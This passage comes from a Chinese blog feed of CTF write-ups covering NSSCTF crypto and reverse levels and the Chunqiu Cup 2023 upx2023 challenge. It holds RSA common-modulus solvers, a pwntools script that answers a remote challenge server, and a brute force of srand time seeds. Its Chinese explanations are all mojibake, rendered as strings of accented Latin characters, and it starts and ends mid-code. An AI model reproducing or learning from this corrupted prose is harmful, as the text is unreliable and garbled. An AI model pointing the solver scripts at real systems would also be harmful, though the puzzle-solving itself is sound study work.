class="string">&#x27;NSSCTF&#123;a81c0d5e-ec6d-2b80&#x27;</span> &#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n                SSN = FTC[j];\n                printf(&quot;flag&quot;);\n            &#125;\n&#125;\nint mian() &#123;\n    int FTC[] = [ -,\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ccccccccccccccccccc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nb, 2, 6, 7, -, d, 5, 8, 4, -, 6, 8, 7, 4, -, f, 1, 2, 6, e, 3, a, 5, 1, 0, 6, 1, &#125;];\n    int lenggggggg = (int) sizeof(FTC) / sizeof(*FTC);\n    bnsScrt(FTC, lenggggggg);\n    int i;\n    for (i = 0; i &lt; lenggggggg; i++)\n        printf(&quot;%d &quot;, FTC[i]);\n    remake 0;\n&#125;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = <span class="string">&#x27;************************************&#x27;</span></span><br><span class="line">r = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (x + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        res = <span class="built_in">str</span>(<span class="built_in">ord</span>(flag[x]) ^ <span class="number">2421</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="built_in">str</span>(<span class="built_in">ord</span>(flag[x]) &lt;&lt; <span class="number">6</span> &lt;&lt; <span class="number">7</span> &gt;&gt; <span class="number">2</span> &gt;&gt; <span class="number">1</span> ^ <span class="number">92</span>)</span><br><span class="line">    r = r + res + <span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(base64.b16encode(base64.b32encode(r.encode(<span class="string">&#x27;utf-8&#x27;</span>)))).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p>ä¸Šé¢printå‡ºæ¥çš„ä¸œè¥¿å¥½åƒæ˜¯ä¸€æ®µcè¯­è¨€ä»£ç ï¼Œä½†æ˜¯è¯­æ³•å¾ˆæŠ½è±¡ï¼Œå°±ç®—æ”¹å®Œè¯­æ³•çš„é”™ï¼Œæˆ‘ä¹Ÿä¸ç†è§£cccccccccæ˜¯å•¥ç©æ„ï¼Œæ ¹æ®åé¢æ­£å¸¸çš„pyè¯­æ³•ï¼Œæ€€ç–‘cä»£ç æ˜¯ç»™æœ€åçš„æœ«å€¼çš„ï¼Œ</p><p>ä¹‹åæœ‰æœºä¼šè¡¥</p><h2 id="CRYPTO">CRYPTO</h2><h3 id="Level-1">Level_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">e1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">e2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = e1 * e2</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="built_in">print</span>(e1)</span><br><span class="line"><span class="built_in">print</span>(e2)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå·²çŸ¥nï¼Œc1ï¼Œc2ï¼Œe1ï¼Œe2ï¼ŒæŠŠe1ï¼Œe2çœ‹æˆpï¼Œq</p><p>é‚£ä¹ˆå¯ä»¥æ ¹æ®$c_1 = m^p \mod n$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">22517647586235353449147432825948355885962082318127038138351524894369583539246623545565501496312996556897362735789505076324197072008392656511657262430676945685471397862981216472634785622155317188784494912316440866051402627470561626691472280850273482836308002341429493460677206562201947000047718275995355772707947408688836667011206588727438261189233517003341094758634490421007907582147392858070623641389171229435187248184443645883661560636995548332475573072064240073037558031928639832259001407585962782698021735648128101459118863015844905452823095147248865104102562991382119836061161756978764495337874807458182581421229</span></span><br><span class="line">c1 = <span class="number">1432393096266401187029059077791766305797845826173887492889260179348416733820890797101745501984437201566364579129066414005659742104885321270122634155922766503333859812540068278962999824043206496595825886026095484801291802992082454776271149083516187121160475839108002133113254134626407840182541809478892306748590016896975053434021666376203540725254480252049443975835307793528287818262102688334515632062552114342619781840154202525919769192765621085008206581226486157149883898548933475155236509073675387541466324512294079413938239828341890576923100769181401944289365386552139418728492565319685207500539721582552448971814</span></span><br><span class="line">c2 = <span class="number">13299679392897297864252207869444022461237574801991239380909482153705185317634241850084078027230394830079554676426505967970943836811048777462696506309466535820372917756458083553031417406403895116557560548183674144457502601887632495739472178857537011190162283185735114683172731936834993707871636782206418680404006299140864001776588991141011500807549645227520128216130966268810165946959810884593793452437010902774726405217517557763322690215690606067996057037379898630878638483268362526985225092000670251641184960698506349245915816808028210142606700394584541282682338561482561343076218115042099753144875658666459825545602</span></span><br><span class="line">e1 = <span class="number">155861690390761931560700906834977917646203451142415617638229284868013723431003139974975998354830978765979365632120896717380895021936387027045347260400512396388028781862427862974453223157509702913026222541667006325100878113871620322023188372501930117363623076837619478555007555970810681502521309925774889678793</span></span><br><span class="line">e2 = <span class="number">144471983652821947847253052623701746810204736865723159569786739658583884214397562204788127484897909964898113250509653721265240138487697822089282456150238116811225975640330930854549232972314642221382625614304415750165289831040623741828600283778523993251940904896081111235859249916040849697146542311990869696453</span></span><br><span class="line"></span><br><span class="line">phi = (e1-<span class="number">1</span>)*(e2-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e1,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;NSSCTF&#123;Y0u_Hav3_S01v3d_Crypt0_Leve1_i&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æ ‡å‡†çš„RSAè§£å¯†æµç¨‹</p><p>ä¹Ÿå¯ä»¥ç”¨å…±æ¨¡æ”»å‡»</p><blockquote><p>å…±æ¨¡æ˜¯æŒ‡ï¼šå°±æ˜¯æ˜æ–‡m,ç›¸åŒã€‚ç”¨ä¸¤ä¸ªå…¬é’¥e1,e2åŠ å¯†å¾—åˆ°ä¸¤ä¸ªç§é’¥d1,d2 å’Œä¸¤ä¸ªå¯†æ–‡c1,c2ï¼ˆeä¸åŒï¼ŒnåŒï¼‰<br>å…±æ¨¡æ”»å‡»ï¼Œå³å½“mä¸å˜çš„æƒ…å†µä¸‹ï¼ŒçŸ¥é“n,e1,e2,c1,c2, å¯ä»¥åœ¨ä¸çŸ¥é“d1,d2çš„æƒ…å†µä¸‹ï¼Œè§£å‡ºm<br>åˆ©ç”¨æ¡ä»¶ä¸º=&gt; gcd(e1,e2)=1</p></blockquote><p>è‹¥ä¸¤ä¸ªeäº’ç´ ï¼Œgcd(e1,e2)=1</p><p>é‚£ä¹ˆä¸€å®šå­˜åœ¨xï¼Œyä½¿å¾—gcd(a,b) = ax+by</p><p>æ‰€ä»¥$e_1s_1+e_2s_2=1$</p><p>æ ¹æ®å¤æ‚çš„æ¨å¯¼è¿‡ç¨‹æœ€åå¾—åˆ°ï¼š</p><p>(c1^s1*c2^s2)%n=m%n=m</p><p>å³ï¼šm = (pow(c_1,s_1,n)*pow(c_2,s_2,n)) % n</p><p>æ‰€ä»¥å¦ä¸€ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">155861690390761931560700906834977917646203451142415617638229284868013723431003139974975998354830978765979365632120896717380895021936387027045347260400512396388028781862427862974453223157509702913026222541667006325100878113871620322023188372501930117363623076837619478555007555970810681502521309925774889678793</span></span><br><span class="line">e2 = <span class="number">144471983652821947847253052623701746810204736865723159569786739658583884214397562204788127484897909964898113250509653721265240138487697822089282456150238116811225975640330930854549232972314642221382625614304415750165289831040623741828600283778523993251940904896081111235859249916040849697146542311990869696453</span></span><br><span class="line">n = <span class="number">22517647586235353449147432825948355885962082318127038138351524894369583539246623545565501496312996556897362735789505076324197072008392656511657262430676945685471397862981216472634785622155317188784494912316440866051402627470561626691472280850273482836308002341429493460677206562201947000047718275995355772707947408688836667011206588727438261189233517003341094758634490421007907582147392858070623641389171229435187248184443645883661560636995548332475573072064240073037558031928639832259001407585962782698021735648128101459118863015844905452823095147248865104102562991382119836061161756978764495337874807458182581421229</span></span><br><span class="line">c1 = <span class="number">1432393096266401187029059077791766305797845826173887492889260179348416733820890797101745501984437201566364579129066414005659742104885321270122634155922766503333859812540068278962999824043206496595825886026095484801291802992082454776271149083516187121160475839108002133113254134626407840182541809478892306748590016896975053434021666376203540725254480252049443975835307793528287818262102688334515632062552114342619781840154202525919769192765621085008206581226486157149883898548933475155236509073675387541466324512294079413938239828341890576923100769181401944289365386552139418728492565319685207500539721582552448971814</span></span><br><span class="line">c2 = <span class="number">13299679392897297864252207869444022461237574801991239380909482153705185317634241850084078027230394830079554676426505967970943836811048777462696506309466535820372917756458083553031417406403895116557560548183674144457502601887632495739472178857537011190162283185735114683172731936834993707871636782206418680404006299140864001776588991141011500807549645227520128216130966268810165946959810884593793452437010902774726405217517557763322690215690606067996057037379898630878638483268362526985225092000670251641184960698506349245915816808028210142606700394584541282682338561482561343076218115042099753144875658666459825545602</span></span><br><span class="line"></span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="Level-2">Level_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># çŒœçŒœæˆ‘æ˜¯è° çŒœå¯¹äº†ç›´æ¥ç§’å‡ºflagå–”</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">p = ***</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c=<span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºè¯´eå¾ˆå¸¸è§ï¼Œç›²çŒœ65537</p><p>pçš„å–å€¼åœ¨ps.txtæ–‡ä»¶ä¸­ï¼Œéå†pç›´æ¥æ±‚å‡ºç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">q=<span class="number">145721736470529261146573065574028992352505611489859183763269215489708531333597694809923949026781460438320576519639268582565188719134157402292313959218961804213310847081787824780075530751842057663327444602428455144829447776271394663729996984613471623158126083062443634493708467568220146024273763894704649472957</span></span><br><span class="line">c=<span class="number">17441814714407189483380175736850663249578989775568187792928771544069162420510939242665830363276698262009780462912108642025299275146709817979705069095332726251759039923303627023610865046363171692163473939115438686877494878334016463787558794121885354719336139401336137097548305393030069499625065664884238710759260231321106291200849044147840392021931720902340003746946851806025722944795391356835342258387797980787437188976704677008092850181043891802072500430200735973581081228711070923822341261809453662427341958883142789220800541626034573952425948295446202775198692920613709157662831071515700549093766182579873408465779</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ps.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ps = [<span class="built_in">int</span>(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e,phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = long_to_bytes(m).decode()</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="Level-3">Level_3</h3><p>å½“æ—¶æ²¡åšå‡ºæ¥ï¼Œåæ¥å‘ç°ncçš„æ—¶å€™åº”è¯¥è¾“ip ç©ºæ ¼ ç«¯å£ è€Œä¸æ˜¯ip:ç«¯å£</p><p>å°±å¾ˆäº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">n,e1,e2,c1,c2</span>):</span><br><span class="line">t = gmpy2.gcd(e1,e2)</span><br><span class="line"><span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">s,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">m = (<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">s,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">m = gmpy2.iroot((<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n)+k*n)%n,t)</span><br><span class="line"><span class="keyword">if</span> m[<span class="number">1</span>]:</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;IP&quot;</span>,ç«¯å£å·)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿™é‡Œéœ€è¦666æ¬¡ï¼Œè¯•äº†è¯•665æ¬¡æ‰“ä¸å‡ºæ¥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">666</span>):</span><br><span class="line">data = sh.recvuntil(<span class="string">b&quot; y0u J01n In th3 NSS t3am?\n py?\n&quot;</span>)</span><br><span class="line">n = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">e1 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">e2 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">c1 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">c2 = <span class="built_in">eval</span>(sh.recvline().decode().strip().split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag = decode(n,e1,e2,c1,c2)</span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;[+] Pl Give Me flaag :&quot;</span>,flag)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#è½¬è‡ªhttps://www.cnblogs.com/mumuhhh/p/17993151#top</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹æ¯2023å†¬ å¤ç°</title>
      <link href="/posts/64aac72c.html"/>
      <url>/posts/64aac72c.html</url>
      
        <content type="html"><![CDATA[<h2 id="re">re</h2><h3 id="upx2023">upx2023</h3><p>å…ˆè„±upxå£³ï¼Œè¿™æ˜¯ä¿®æ”¹äº†æ ‡å¿—ï¼Œç”¨010editoræŠŠupxä¿®æ”¹æˆUPXç„¶åç”¨upx -dè„±å£³</p><p>è¿›å…¥ä¸»å‡½æ•°åï¼Œå‘ç°é€»è¾‘å¤§æ¦‚æ˜¯</p><ol><li>è¯»flag</li><li>å˜æ¢flag</li><li>ç”¨éšæœºæ•°å¼‚æˆ–flagåŠ å¯†</li><li>å’Œcheckæ•°ç»„æ£€éªŒ</li></ol><p>é‚£ä¹ˆå¯ä»¥ç›´æ¥æ‹¿åˆ°checkæ•°ç»„<br>æˆ‘ä»¬è¦æ‰¾flagå°±è¦æ‰¾åˆ°é‚£ä¸ªéšæœºæ•°ï¼Œsrandå‡½æ•°ä¼ å…¥çš„æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Seed = time(<span class="number">0</span>i64);</span><br><span class="line">srand(Seed);</span><br></pre></td></tr></table></figure><p>åŒæ—¶åŠ¨æ€è°ƒè¯•å¯ä»¥å¾—åˆ°ï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">å˜æˆ</span></span><br><span class="line"><span class="language-xml">f</span><span class="template-variable">&#123;37BFGNRVZlg02468ACEGIKMOQSUWY&#125;</span><span class="language-xml">a159DHLPTX</span></span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ‰¾æ—¶é—´éå†ï¼Œéå†å»å¹´çš„æ—¶é—´æˆ³</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">/*unsigned int seed = time(0);</span></span><br><span class="line"><span class="comment">srand(seed);</span></span><br><span class="line"><span class="comment">cout &lt;&lt; &#x27;[&#x27;;</span></span><br><span class="line"><span class="comment">for (int i = 0; i &lt; 42; i++) &#123;</span></span><br><span class="line"><span class="comment">int r = rand() % 255;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; r;</span></span><br><span class="line"><span class="comment">if (i != 41) &#123;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; &#x27;,&#x27;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; &#x27;]&#x27;;*/</span></span><br><span class="line"><span class="type">int</span> check[<span class="number">6</span>];</span><br><span class="line">check[<span class="number">0</span>] = <span class="string">&#x27;f&#x27;</span> ^ <span class="number">0x9</span>;</span><br><span class="line">check[<span class="number">1</span>] = <span class="string">&#x27;&#123;&#x27;</span> ^ <span class="number">0x63</span>;</span><br><span class="line">check[<span class="number">2</span>] = <span class="string">&#x27;l&#x27;</span>^ <span class="number">0xC6</span>;</span><br><span class="line">check[<span class="number">3</span>] = <span class="string">&#x27;g&#x27;</span>^ <span class="number">0x65</span>;</span><br><span class="line">check[<span class="number">4</span>] = <span class="string">&#x27;&#125;&#x27;</span>^ <span class="number">0xFD</span>;</span><br><span class="line">check[<span class="number">5</span>] = <span class="string">&#x27;a&#x27;</span>^ <span class="number">0xFA</span>;</span><br><span class="line"><span class="type">int</span> r[<span class="number">42</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> time = <span class="number">1672416000</span>; time &lt; <span class="number">1706253391</span>; time++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">srand</span>(time);</span><br><span class="line"><span class="keyword">if</span> (check[<span class="number">0</span>] != (r[<span class="number">0</span>] = <span class="built_in">rand</span>() % <span class="number">255</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (check[<span class="number">1</span>] != (r[<span class="number">1</span>] = <span class="built_in">rand</span>() % <span class="number">255</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">r[i] = <span class="built_in">rand</span>() % <span class="number">255</span>;</span><br><span class="line"><span class="keyword">if</span> ((check[<span class="number">2</span>] != r[<span class="number">11</span>]) || (check[<span class="number">3</span>] != r[<span class="number">12</span>]) || (check[<span class="number">4</span>] != r[<span class="number">31</span>]) || (check[<span class="number">5</span>] != r[<span class="number">32</span>]))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (time &lt; <span class="number">1706253391</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;the seed is: &quot;</span> &lt;&lt; time&lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">42</span>; j++) &#123;</span><br><span class="line">cout &lt;&lt; r[j];</span><br><span class="line"><span class="keyword">if</span> (j != <span class="number">41</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°seed:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the seed is: <span class="number">1682145110</span></span><br><span class="line">[<span class="number">111,24,236,196</span>,<span class="number">58,186,93,97</span>,<span class="number">61,51,169,170</span>,<span class="number">2,17,113,139</span>,<span class="number">162,38,14,77</span>,<span class="number">131,66,112,202</span>,<span class="number">80,113,231,107</span>,<span class="number">15,50,159,128</span>,<span class="number">155,183,227,184</span>,<span class="number">224,28,16,180</span>,<span class="number">42</span>,<span class="number">57</span>]</span><br></pre></td></tr></table></figure><p>æœ€åå¼‚æˆ–ä¸€ä¸‹ï¼Œå‘ç°æ˜¯æ‰“ä¹±çš„flag</p><p>æ ¹æ®è¿™ä¸ªå¯¹åº”å†™ä»£ç é€†å‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">check = [<span class="number">0x09</span>, <span class="number">0x63</span>, <span class="number">0xD9</span>, <span class="number">0xF6</span>, <span class="number">0x58</span>, <span class="number">0xDD</span>, <span class="number">0x3F</span>, <span class="number">0x4C</span>, </span><br><span class="line">         <span 